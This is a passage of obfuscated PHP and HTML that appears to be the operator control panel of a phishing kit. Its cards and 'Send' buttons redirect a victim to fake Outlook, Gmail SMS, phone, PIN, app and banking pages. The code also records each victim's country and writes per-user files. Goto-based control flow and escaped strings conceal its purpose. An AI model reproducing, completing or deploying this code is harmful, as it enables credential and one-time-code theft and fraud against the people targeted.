"\x20\x3c\x70\40\163\x74\x79\154\145\75\x22\164\x65\x78\164\55\x61\154\151\x67\156\72\x63\x65\x6e\164\x65\x72\42\x3e\x3c\x73\x70\x61\156\40\163\x74\171\154\x65\x3d\42\143\x6f\x6c\x6f\x72\72\x23\x65\67\x34\143\63\x63\42\76\x3c\163\x74\x72\157\x6e\x67\x3e\x4e\x6f\x74\40\101\166\x61\151\x6c\x61\x62\x6c\x65\74\57\163\164\162\157\156\x67\76\x3c\57\163\160\x61\x6e\x3e\74\x2f\x70\76"; $_SESSION["\151\163\x69\x62\141\156\x61\x70\x70"] = "\40\x3c\160\40\x73\x74\x79\154\145\x3d\x22\164\x65\170\164\x2d\141\154\x69\x67\x6e\x3a\x63\145\x6e\x74\x65\162\42\x3e\74\163\160\x61\156\40\163\164\x79\x6c\145\x3d\x22\x63\x6f\154\x6f\162\72\43\x65\67\x34\143\x33\x63\42\x3e\x3c\163\x74\162\157\156\147\x3e\x4e\157\164\40\x41\166\x61\151\154\x61\142\154\x65\74\x2f\x73\164\x72\x6f\156\x67\76\74\57\163\160\x61\156\76\x3c\x2f\160\76"; $_SESSION["\x69\163\163\155\x73"] = "\x20\x3c\160\x20\163\x74\x79\x6c\145\x3d\x22\x74\145\170\164\55\141\x6c\151\x67\x6e\72\143\145\x6e\164\145\162\42\x3e\x3c\163\160\141\156\x20\163\164\171\154\145\75\42\x63\157\x6c\x6f\162\72\43\x65\x37\64\x63\63\143\x22\x3e\x3c\163\164\x72\x6f\156\147\76\x4e\x6f\x74\x20\101\166\141\x69\x6c\x61\x62\x6c\145\x3c\x2f\x73\x74\162\x6f\156\147\76\74\x2f\x73\x70\x61\156\x3e\x3c\x2f\160\x3e"; $_SESSION["\151\x73\160\150\x6f\x6e\145"] = "\40\x3c\160\x20\x73\x74\x79\x6c\x65\75\x22\164\145\x78\164\x2d\141\154\x69\x67\x6e\72\143\x65\x6e\164\145\x72\42\x3e\x3c\163\160\141\x6e\40\x73\164\171\154\x65\x3d\42\x63\157\x6c\x6f\162\72\43\145\67\x34\143\63\x63\x22\x3e\74\163\x74\162\157\x6e\x67\x3e\116\157\164\40\x41\x76\141\151\154\141\x62\x6c\145\74\57\x73\164\x72\157\156\x67\76\x3c\57\x73\x70\141\156\x3e\74\57\160\76"; $_SESSION["\151\163\x6c\157\147\151\x6e"] = "\x20\x3c\160\x20\x73\x74\171\154\145\x3d\x22\164\145\170\164\x2d\x61\154\151\x67\x6e\x3a\x63\x65\x6e\164\x65\162\42\x3e\x3c\163\160\141\x6e\40\x73\x74\171\154\145\75\42\x63\157\x6c\x6f\x72\x3a\x23\x65\x37\x34\x63\63\x63\x22\x3e\74\163\164\162\x6f\x6e\147\x3e\116\x6f\x74\40\x41\x76\x61\151\x6c\141\142\x6c\x65\74\x2f\163\x74\162\157\x6e\x67\x3e\74\x2f\x73\160\141\x6e\x3e\74\57\160\76"; $_SESSION["\151\x73\x6f\x75\164\154\157\x6f\x6b\x5f\x6c\x6f\x67\151\156"] = "\40\74\160\x20\x73\x74\x79\x6c\x65\x3d\42\x74\145\x78\164\x2d\141\154\x69\147\x6e\x3a\143\x65\x6e\x74\x65\162\42\76\74\x73\160\x61\x6e\x20\163\164\171\x6c\x65\75\x22\143\157\x6c\157\x72\x3a\x23\145\67\64\143\63\143\42\76\x3c\x73\164\x72\x6f\x6e\147\x3e\116\157\x74\x20\101\x76\x61\151\x6c\x61\x62\x6c\x65\74\x2f\x73\x74\x72\157\156\147\76\x3c\57\x73\x70\x61\x6e\x3e\x3c\57\x70\x3e"; $_SESSION["\151\x73\x6f\165\164\x6c\157\x6f\x6b\x5f\160\151\x6e"] = "\x20\74\x70\x20\x73\x74\171\x6c\x65\x3d\42\x74\145\x78\164\55\141\x6c\151\x67\156\x3a\143\x65\x6e\164\145\162\x22\76\74\x73\160\141\156\x20\163\x74\x79\154\145\75\x22\143\157\x6c\x6f\162\72\x23\145\x37\x34\x63\x33\x63\x22\x3e\74\163\x74\162\157\156\x67\76\116\157\164\x20\101\x76\x61\151\154\141\x62\x6c\x65\74\57\x73\x74\162\x6f\156\x67\x3e\74\57\x73\160\141\156\x3e\x3c\x2f\x70\x3e"; $_SESSION["\x69\x73\157\165\164\154\x6f\x6f\153\x5f\141\160\x70"] = "\40\74\160\40\x73\164\x79\x6c\x65\x3d\42\x74\x65\170\x74\x2d\141\x6c\151\x67\156\x3a\143\145\x6e\164\x65\162\42\x3e\x3c\x73\x70\x61\156\40\x73\x74\x79\x6c\145\75\42\143\157\x6c\x6f\162\x3a\43\x65\67\64\x63\x33\143\x22\x3e\x3c\163\164\162\157\x6e\147\x3e\116\x6f\164\x20\x41\x76\x61\x69\x6c\141\142\154\145\x3c\57\x73\164\162\157\156\147\x3e\74\x2f\x73\x70\x61\x6e\x3e\74\x2f\x70\76"; $_SESSION["\x69\163\147\157\137\154\157\x67\x69\156"] = "\x20\x3c\160\40\x73\x74\x79\x6c\x65\x3d\42\164\x65\x78\x74\55\141\154\x69\x67\156\x3a\143\145\156\x74\145\x72\42\76\x3c\x73\x70\x61\156\40\x73\x74\171\x6c\x65\75\42\x63\157\x6c\x6f\x72\72\43\x65\67\x34\143\x33\x63\x22\x3e\74\x73\x74\x72\157\x6e\x67\76\x4e\157\164\x20\101\x76\141\x69\154\141\x62\154\145\x3c\x2f\x73\164\162\x6f\156\147\76\x3c\x2f\x73\x70\141\x6e\x3e\x3c\x2f\x70\76"; $_SESSION["\151\163\147\x6f\x5f\x70\x68\157\x6e\x65"] = "\x20\x3c\x70\40\x73\164\171\154\x65\75\42\164\x65\x78\164\55\x61\154\x69\x67\156\x3a\143\x65\x6e\164\145\x72\42\76\74\163\160\141\x6e\x20\163\164\171\x6c\145\75\42\143\157\154\157\x72\x3a\43\145\x37\x34\x63\63\x63\42\76\x3c\x73\164\x72\x6f\x6e\147\x3e\116\157\x74\40\101\x76\x61\151\154\x61\142\154\x65\x3c\57\x73\164\162\157\x6e\x67\76\74\57\x73\160\141\x6e\76\74\x2f\x70\76"; $_SESSION["\151\163\x67\x6f\137\163\x6d\x73"] = "\x20\x3c\x70\40\x73\x74\171\154\145\75\x22\x74\x65\x78\164\x2d\x61\x6c\151\x67\x6e\72\x63\145\156\164\x65\162\x22\76\74\x73\x70\141\x6e\40\163\164\x79\154\145\75\x22\143\157\x6c\157\x72\72\x23\x65\67\x34\x63\63\x63\42\x3e\x3c\163\x74\162\x6f\156\x67\x3e\116\x6f\x74\x20\101\166\141\x69\154\x61\x62\154\x65\74\x2f\163\x74\x72\x6f\x6e\x67\76\74\x2f\x73\160\141\x6e\76\x3c\57\x70\76"; $_SESSION["\151\163\x67\157\137\x61\x70\x70"] = "\x20\74\x70\x20\163\x74\x79\154\145\x3d\42\x74\145\170\x74\x2d\x61\x6c\151\x67\x6e\x3a\143\x65\156\164\x65\162\x22\x3e\74\x73\160\x61\156\x20\163\x74\x79\x6c\x65\75\x22\143\x6f\x6c\x6f\x72\72\x23\145\67\x34\x63\63\x63\x22\x3e\x3c\x73\x74\162\157\x6e\x67\76\116\157\164\x20\x41\x76\x61\151\x6c\x61\142\x6c\x65\74\57\163\x74\x72\157\x6e\147\x3e\74\57\163\160\x61\156\76\x3c\x2f\x70\x3e"; $_SESSION["\151\163\x67\x6f\137\x70\x69\156"] = "\40\74\x70\40\163\164\x79\154\x65\75\42\164\145\x78\164\55\x61\x6c\x69\147\156\x3a\143\x65\156\164\x65\162\42\76\x3c\x73\x70\x61\x6e\x20\x73\x74\171\x6c\145\75\42\143\157\154\157\162\x3a\43\145\x37\64\143\x33\x63\x22\x3e\74\163\164\162\157\x6e\147\x3e\x4e\157\164\40\101\166\141\x69\154\141\x62\154\x65\74\x2f\163\x74\x72\x6f\156\x67\x3e\74\x2f\x73\x70\141\x6e\76\x3c\57\160\x3e"; $_SESSION["\x69\x73\165\164\x69\154\x69\x73\141\x74\x65\x75\162"] = "\40\74\160\x20\163\x74\x79\x6c\x65\x3d\x22\164\145\170\x74\55\x61\x6c\x69\x67\x6e\x3a\x63\145\156\164\x65\x72\42\76\x3c\163\160\x61\x6e\40\163\x74\x79\x6c\145\75\42\x63\x6f\x6c\x6f\x72\x3a\43\145\x37\64\143\x33\143\42\x3e\74\x73\x74\162\x6f\x6e\x67\76\116\157\x74\40\x41\166\x61\151\x6c\x61\x62\x6c\x65\x3c\57\163\164\162\157\x6e\x67\x3e\74\x2f\x73\160\141\156\76\74\x2f\160\x3e"; $_SESSION["\x69\x73\165\x73\x61\x67\x65\x72"] = "\40\74\x70\40\163\164\171\x6c\x65\x3d\42\x74\x65\x78\x74\x2d\x61\x6c\151\147\156\72\143\x65\x6e\164\145\x72\42\x3e\74\163\160\x61\156\x20\x73\164\171\x6c\145\x3d\42\x63\157\154\157\x72\x3a\x23\x65\67\64\x63\x33\x63\x22\76\x3c\163\x74\162\157\x6e\x67\x3e\x4e\x6f\x74\x20\x41\x76\141\151\x6c\141\x62\154\x65\x3c\x2f\163\164\x72\157\x6e\x67\76\x3c\57\x73\x70\141\156\x3e\74\x2f\160\76"; $_SESSION["\151\163\141\x6c\x65\x72\x74"] = "\40\74\x70\40\x73\164\x79\154\x65\x3d\x22\x74\145\170\x74\x2d\x61\x6c\151\147\x6e\72\x63\x65\156\164\x65\162\42\76\74\x73\x70\x61\156\40\163\x74\171\154\145\75\x22\143\157\154\x6f\x72\72\x23\145\x37\x34\x63\63\x63\42\x3e\74\x73\x74\162\157\x6e\147\76\x4e\x6f\164\x20\101\166\x61\x69\154\141\x62\154\145\74\57\x73\164\x72\x6f\156\147\76\x3c\57\x73\160\x61\156\76\74\57\x70\x3e"; $_SESSION["\151\x73\x6f\x70\x65\x72\x61\164\x69\157\156\163\141\x70\x70"] = "\x20\x3c\x70\x20\x73\x74\x79\x6c\145\x3d\x22\x74\145\170\164\x2d\x61\x6c\x69\x67\156\x3a\x63\x65\x6e\164\x65\x72\42\76\x3c\163\x70\x61\x6e\40\x73\x74\171\x6c\145\75\x22\143\x6f\x6c\157\x72\x3a\x23\x65\67\64\143\63\x63\x22\x3e\74\x73\x74\x72\157\156\147\x3e\x4e\157\x74\40\101\x76\141\151\154\141\142\154\x65\x3c\57\163\x74\x72\x6f\156\147\x3e\74\x2f\163\x70\141\x6e\76\74\x2f\160\x3e"; $_SESSION["\151\163\x6f\160\x65\x72\x61\164\x69\x6f\156\163\163\x6d\x73"] = "\40\74\x70\40\x73\x74\x79\x6c\x65\x3d\42\164\145\170\164\55\x61\x6c\x69\147\156\72\x63\x65\x6e\164\x65\x72\x22\76\74\163\x70\141\156\40\163\x74\x79\x6c\x65\x3d\x22\143\157\x6c\x6f\162\72\43\145\x37\x34\143\x33\x63\x22\x3e\74\163\x74\x72\157\x6e\x67\x3e\116\157\164\x20\101\166\141\151\154\x61\142\x6c\145\74\x2f\163\164\162\157\x6e\147\x3e\x3c\x2f\163\160\141\x6e\x3e\x3c\57\160\76"; $_SESSION["\141\154\x6c\x5f\x70\141\147\145"] = ''; } goto RPyS4; gj8t3: if (check_file($_SESSION["\165\x73\145\x72\151\x64"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\165\163\145\162\151\144"]; ?>
', 'app')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg
                                                    fill="#ffffff"
                                                    width="40px"
                                                    height="40px"
                                                    viewBox="0 0 64 64"
                                                    id="Layer_1_1_"
                                                    version="1.1"
                                                    xml:space="preserve"
                                                    xmlns="http://www.w3.org/2000/svg"
                                                    xmlns:xlink="http://www.w3.org/1999/xlink"
                                                    stroke="#ffffff"
                                                >
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <g>
                                                            <rect height="2" width="8" x="28" y="57" />
                                                            <path
                                                                d="M58,11h-6V6c0-2.757-2.243-5-5-5H17c-2.757,0-5,2.243-5,5v25H6c-2.757,0-5,2.243-5,5v20.805L10.287,51H12v7 c0,2.757,2.243,5,5,5h30c2.757,0,5-2.243,5-5V31h1.713L63,36.805V16C63,13.243,60.757,11,58,11z M17,3h30c1.654,0,3,1.346,3,3v1H14 V6C14,4.346,15.346,3,17,3z M9.713,49L3,53.195V36c0-1.654,1.346-3,3-3h22c1.654,0,3,1.346,3,3v10c0,1.654-1.346,3-3,3H9.713z M47,61H17c-1.654,0-3-1.346-3-3v-3h36v3C50,59.654,48.654,61,47,61z M50,53H14v-2h14c2.757,0,5-2.243,5-5V36c0-2.757-2.243-5-5-5 H14V9h36v2H36c-2.757,0-5,2.243-5,5v10c0,2.757,2.243,5,5,5h14V53z M61,33.195L54.287,29H52h-2H36c-1.654,0-3-1.346-3-3V16 c0-1.654,1.346-3,3-3h22c1.654,0,3,1.346,3,3V33.195z"
                                                            />
                                                            <path d="M47,18c-1.654,0-3,1.346-3,3s1.346,3,3,3s3-1.346,3-3S48.654,18,47,18z M47,22c-0.551,0-1-0.449-1-1s0.449-1,1-1 s1,0.449,1,1S47.551,22,47,22z" />
                                                            <path d="M55,18c-1.654,0-3,1.346-3,3s1.346,3,3,3s3-1.346,3-3S56.654,18,55,18z M55,22c-0.551,0-1-0.449-1-1s0.449-1,1-1 s1,0.449,1,1S55.551,22,55,22z" />
                                                            <path d="M39,18c-1.654,0-3,1.346-3,3s1.346,3,3,3s3-1.346,3-3S40.654,18,39,18z M39,22c-0.551,0-1-0.449-1-1s0.449-1,1-1 s1,0.449,1,1S39.551,22,39,22z" />
                                                            <path
                                                                d="M23,41.184V41c0-3.309-2.691-6-6-6s-6,2.691-6,6v0.184C9.839,41.598,9,42.698,9,44c0,1.654,1.346,3,3,3h3v-6h-2 c0-2.206,1.794-4,4-4s4,1.794,4,4h-2v6h3c1.654,0,3-1.346,3-3C25,42.698,24.161,41.598,23,41.184z M13,45h-1c-0.551,0-1-0.448-1-1 s0.449-1,1-1h1V45z M22,45h-1v-2h1c0.551,0,1,0.448,1,1S22.551,45,22,45z"
                                                            />
                                                            <rect height="2" width="2" x="35" y="40" />
                                                            <rect height="2" width="2" x="39" y="40" />
                                                            <rect height="2" width="2" x="43" y="40" />
                                                            <rect height="2" width="2" x="19" y="20" />
                                                            <rect height="2" width="2" x="23" y="20" />
                                                            <rect height="2" width="2" x="27" y="20" />
                                                        </g>
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Application Page</div>
                                                <?php  echo $_SESSION["\151\163\x61\160\x70"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto d0ir6; YE884: if ($ads_country) { $countryLowercase = strtolower(substr($ads_country, 0, 2)); $_SESSION["\143\157\165\x6e\x74\x72\x79\x4c\157\167\145\x72\x63\x61\163\145"] = $countryLowercase; } else { $countryLowercase = ''; $_SESSION["\x63\157\165\x6e\x74\x72\x79\x4c\157\167\145\162\143\141\x73\145"] = ''; } goto rvvaZ; I9smZ: if (check_file($_SESSION["\165\x73\145\162\x69\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="openModal('modal3')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                                                    <title>file_type_outlook</title>
                                                    <path d="M19.484,7.937v5.477L21.4,14.619a.489.489,0,0,0,.21,0l8.238-5.554a1.174,1.174,0,0,0-.959-1.128Z" style="fill: #0072c6;" />
                                                    <path d="M19.484,15.457l1.747,1.2a.522.522,0,0,0,.543,0c-.3.181,8.073-5.378,8.073-5.378V21.345a1.408,1.408,0,0,1-1.49,1.555H19.483V15.457Z" style="fill: #0072c6;" />
                                                    <path
                                                        d="M10.44,12.932a1.609,1.609,0,0,0-1.42.838,4.131,4.131,0,0,0-.526,2.218A4.05,4.05,0,0,0,9.02,18.2a1.6,1.6,0,0,0,2.771.022,4.014,4.014,0,0,0,.515-2.2,4.369,4.369,0,0,0-.5-2.281A1.536,1.536,0,0,0,10.44,12.932Z"
                                                        style="fill: #0072c6;"
                                                    />
                                                    <path
                                                        d="M2.153,5.155V26.582L18.453,30V2ZM13.061,19.491a3.231,3.231,0,0,1-2.7,1.361,3.19,3.19,0,0,1-2.64-1.318A5.459,5.459,0,0,1,6.706,16.1a5.868,5.868,0,0,1,1.036-3.616A3.267,3.267,0,0,1,10.486,11.1a3.116,3.116,0,0,1,2.61,1.321,5.639,5.639,0,0,1,1,3.484A5.763,5.763,0,0,1,13.061,19.491Z"
                                                        style="fill: #0072c6;"
                                                    />
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Outlook APP</div>
                                                <?php  echo $_SESSION["\151\x73\x6f\165\x74\x6c\x6f\x6f\x6b\x5f\141\x70\160"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto MyWQU; sQhEG: $_SESSION["\x4e\152\157\x70\x66"] = isset($info["\143\x6f\165\x6e\164\162\171\103\157\144\145"]) ? $info["\x63\157\165\156\164\x72\171\x43\157\144\x65"] : null; goto pqDWd; IVwSj: $_SESSION["\x42\154\x61\x73\141\143\x6f\x75\x6e"] = isset($info["\x63\x6f\165\156\x74\162\x79"]) ? $info["\x63\157\165\x6e\164\x72\x79"] : null; goto sQhEG; xTNsO: $file_s = "\141\160\x70\56\160\150\x70"; goto gj8t3; pPivS: function up_app($user, $content) { $filename = "\141\160\x70\56\164\170\x74"; $filePath = $user . "\x2f" . $filename; if (file_exists($filePath)) { file_put_contents($filePath, $content); } else { $file = fopen($filePath, "\167"); fwrite($file, $content); fclose($file); } } goto BlD2G; mBOM3: ?>
" bis_skin_checked="1">
                                                            <small class="text-medium-emphasis text-truncate">Country</small>
                                                            <div class="fs-5 fw-semibold" bis_skin_checked="1">
                                                                <span class="fi fi-<?php  goto MgHg6; a5syK: $file_s = "\x69\142\x61\156\55\x68\x6f\155\x65\x2e\x70\x68\x70"; goto AjHRM; xKQ0C: $file_s = "\154\157\x67\x6f\165\164\56\160\150\x70"; goto BjSKv; cy5qK: $file_s = "\160\151\x6e\x2e\160\x68\160"; goto ZNBR4; W2UsE: $file_s = "\163\x6d\x73\56\160\x68\160"; goto pHOUy; rzXAt: function up_file($user, $content) { $filename = "\141\x70\151\x2e\x74\x78\164"; $filePath = $user . "\x2f" . $filename; if (file_exists($filePath)) { file_put_contents($filePath, $content); } else { $file = fopen($filePath, "\167"); fwrite($file, $content); fclose($file); } } goto hTSAf; NeCkI: $file_s = "\147\157\137\163\155\163\x2e\160\150\160"; goto Mp2SO; Mp2SO: if (check_file($_SESSION["\165\163\x65\x72\151\x64"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\165\163\145\162\151\x64"]; ?>
', 'go_sms')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="-0.5 0 48 48" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                                    <g id="Icons" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                        <g id="Color-" transform="translate(-401.000000, -860.000000)">
                                                            <g id="Google" transform="translate(401.000000, 860.000000)">
                                                                <path
                                                                    d="M9.82727273,24 C9.82727273,22.4757333 10.0804318,21.0144 10.5322727,19.6437333 L2.62345455,13.6042667 C1.08206818,16.7338667 0.213636364,20.2602667 0.213636364,24 C0.213636364,27.7365333 1.081,31.2608 2.62025,34.3882667 L10.5247955,28.3370667 C10.0772273,26.9728 9.82727273,25.5168 9.82727273,24"
                                                                    id="Fill-1"
                                                                    fill="#FBBC05"
                                                                ></path>
                                                                <path
                                                                    d="M23.7136364,10.1333333 C27.025,10.1333333 30.0159091,11.3066667 32.3659091,13.2266667 L39.2022727,6.4 C35.0363636,2.77333333 29.6954545,0.533333333 23.7136364,0.533333333 C14.4268636,0.533333333 6.44540909,5.84426667 2.62345455,13.6042667 L10.5322727,19.6437333 C12.3545909,14.112 17.5491591,10.1333333 23.7136364,10.1333333"
                                                                    id="Fill-2"
                                                                    fill="#EB4335"
                                                                ></path>
                                                                <path
                                                                    d="M23.7136364,37.8666667 C17.5491591,37.8666667 12.3545909,33.888 10.5322727,28.3562667 L2.62345455,34.3946667 C6.44540909,42.1557333 14.4268636,47.4666667 23.7136364,47.4666667 C29.4455,47.4666667 34.9177955,45.4314667 39.0249545,41.6181333 L31.5177727,35.8144 C29.3995682,37.1488 26.7323182,37.8666667 23.7136364,37.8666667"
                                                                    id="Fill-3"
                                                                    fill="#34A853"
                                                                ></path>
                                                                <path
                                                                    d="M46.1454545,24 C46.1454545,22.6133333 45.9318182,21.12 45.6113636,19.7333333 L23.7136364,19.7333333 L23.7136364,28.8 L36.3181818,28.8 C35.6879545,31.8912 33.9724545,34.2677333 31.5177727,35.8144 L39.0249545,41.6181333 C43.3393409,37.6138667 46.1454545,31.6490667 46.1454545,24"
                                                                    id="Fill-4"
                                                                    fill="#4285F4"
                                                                ></path>
                                                            </g>
                                                        </g>
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">GMAIL SMS</div>
                                                <?php  echo $_SESSION["\151\x73\x67\157\137\163\x6d\x73"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto eg9PA; QJaJ3: ?>
								
								
								
								
								<?php  goto QFuwd; W85bu: ?>
								<?php  goto BL_wO; hWD88: $file_s = "\x6f\165\x74\154\157\157\153\x5f\x61\160\x70\56\160\150\160"; goto I9smZ; YRtHs: if (check_file($_SESSION["\x75\x73\145\162\x69\144"], $file_s)) { ?>
							  
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\x75\x73\x65\162\x69\144"]; ?>
', 'phone')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" stroke="#ffffff">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path
                                                            d="M21 10H14.6C14.0399 10 13.7599 10 13.546 9.89101C13.3578 9.79513 13.2049 9.64215 13.109 9.45399C13 9.24008 13 8.96005 13 8.4V5M10 5H17.8C18.9201 5 19.4802 5 19.908 5.21799C20.2843 5.40973 20.5903 5.71569 20.782 6.09202C21 6.51984 21 7.07989 21 8.2V17.8C21 18.9201 21 19.4802 20.782 19.908C20.5903 20.2843 20.2843 20.5903 19.908 20.782C19.4802 21 18.9201 21 17.8 21H6.2C5.07989 21 4.51984 21 4.09202 20.782C3.71569 20.5903 3.40973 20.2843 3.21799 19.908C3 19.4802 3 18.9201 3 17.8V8.2C3 7.07989 3 6.51984 3.21799 6.09202C3.40973 5.71569 3.71569 5.40973 4.09202 5.21799C4.49359 5.01338 5.01165 5.00082 6 5.00005M10 5V4.6C10 4.03995 10 3.75992 9.89101 3.54601C9.79513 3.35785 9.64215 3.20487 9.45399 3.10899C9.24008 3 8.96005 3 8.4 3H7.6C7.03995 3 6.75992 3 6.54601 3.10899C6.35785 3.20487 6.20487 3.35785 6.10899 3.54601C6 3.75992 6 4.03995 6 4.6V5.00005M10 5V15.4C10 15.9601 10 16.2401 9.89101 16.454C9.79513 16.6422 9.64215 16.7951 9.45399 16.891C9.24008 17 8.96005 17 8.4 17H7.6C7.03995 17 6.75992 17 6.54601 16.891C6.35785 16.7951 6.20487 16.6422 6.10899 16.454C6 16.2401 6 15.9601 6 15.4V5.00005M14 14H14.01V13.99H14V14ZM14 17H14.01V17.01H14V17ZM17 17H17.01V17.01H17V17ZM17 14H17.01V14.01H17V14Z"
                                                            stroke="#ffffff"
                                                            stroke-width="2"
                                                            stroke-linecap="round"
                                                            stroke-linejoin="round"
                                                        />
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Phone Page</div>
                                                <?php  echo $_SESSION["\x69\163\x70\x68\x6f\156\145"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto pCDKP; Wm6WY: ?>
								
								<?php  goto mYV42; LewDS: if (check_file($_SESSION["\165\163\145\162\151\x64"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\165\163\x65\x72\151\x64"]; ?>
', 'usager')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="#ffffff" stroke-width="2"></path>
                                                        <path d="M3.59998 15H14.15" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M6.55115 4.93823L9.81128 14.9719" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M17.0323 4.6355L8.49722 10.8366" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M20.5591 14.5104L12.024 8.30924" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M12.2574 20.9159L15.5176 10.8822" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                    </g>
                                                </svg>
                                            </div>
